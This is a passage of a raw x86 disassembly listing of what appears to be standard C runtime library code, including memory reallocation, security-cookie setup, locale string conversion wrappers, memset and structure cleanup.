  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
